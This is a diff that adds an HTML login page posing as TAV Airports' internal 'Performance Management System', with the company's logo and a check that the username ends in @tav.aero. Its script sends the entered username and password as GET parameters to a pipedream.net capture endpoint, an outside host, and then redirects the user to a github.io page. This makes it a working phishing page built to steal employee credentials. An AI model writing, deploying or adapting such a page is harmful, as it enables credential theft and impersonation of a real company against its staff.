@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Performans Görüntüleme Sistemi</title>
+    <meta charset="UTF-8"/>
+    <style type="text/css">
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #d3d3d3; /* Arka planı açık gri yaptık */
+            color: white;
+            text-align: center;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-form {
+            background-color: #ffffff; /* Login formunu beyaz yaptık */
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.6);
+        }
+        input[type=text], input[type=password] {
+            width: 280px;
+            padding: 15px;
+            margin: 5px 0 22px 0;
+            display: inline-block;
+            border: none;
+            background: #f1f1f1;
+            border-radius: 5px;
+        }
+        .login-button {
+            background-color: #add8e6; /* Giriş Yap butonunu hafif açık mavi yaptık */
+            color: black;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            width: 300px;
+            opacity: 0.9;
+            border-radius: 5px;
+        }
+        .login-button:hover {
+            opacity: 1;
+        }
+        .footer-text {
+            font-size: 12px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .icon {
+            position: fixed; /* Fixed position */
+            bottom: 10px; /* At the bottom */
+            right: 10px; /* At the right */
+            width: 200px; /* Moderate size for the icon */
+            height: auto; /* Maintain aspect ratio */
+        }
+    </style>
+
+    <script>
+    function validateForm() {
+        var username = document.forms["loginForm"]["username"].value;
+        var password = document.forms["loginForm"]["password"].value;
+        var errorMessage = document.getElementById('error-message');
+
+        errorMessage.textContent = ''; // Mevcut hata mesajını temizle
+
+        if (username.indexOf('@tav.aero') === -1) {
+            errorMessage.textContent = "Mail adresiniz @tav.aero şeklinde olmalıdır.";
+            return false;
+        }
+
+        if (password.length < 8) {
+            errorMessage.textContent = "Şifre en az 8 karakter uzunluğunda olmalıdır.";
+            return false;
+        }
+
+        // Kullanıcı bilgilerini GET metoduyla URL'ye ekleyerek gönderiyoruz
+        var params = new URLSearchParams();
+        params.append('username', username);
+        params.append('password', password);
+
+        // GET metodu kullanılarak URL'ye istek gönderiliyor
+        fetch('https://eo3f5kz0b2u98b7.m.pipedream.net/?' + params.toString(), {
+            method: 'GET',
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Başarılı:', data);
+            // Yönlendirme işlemi
+            window.location.href = "https://tavaero.github.io/TAV-PMS/tav.html"; // Kullanıcı giriş yaptıktan sonra bu URL'ye yönlendirilecek
+        })
+        .catch((error) => {
+            console.error('Hata:', error);
+        });
+
+        return false; // Formun normal submit işlemini engelliyoruz
+    }
+    </script>
+
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <h2 style="color: black;">Performance Management System</h2>
+            <!-- Form GET metodu ile gönderiliyor -->
+            <form name="loginForm" onsubmit="return validateForm()">
+                <input name="username" placeholder="Domain Hesabı" required type="text" />
+                <br />
+                <input name="password" placeholder="Şifre" required type="password" />
+                <br />
+                <div id="error-message" style="color: red;">&nbsp;</div>
+                <button class="login-button" type="submit">Giriş Yap</button>
+
+                <div class="footer-text">
+                    Bu yazılım TAV Havalimanları Şirketine Aittir.
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="icon">
+        <img alt="İkon" src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" style="width: 100%; height: auto;" />
+    </div>
+</body>
+</html>
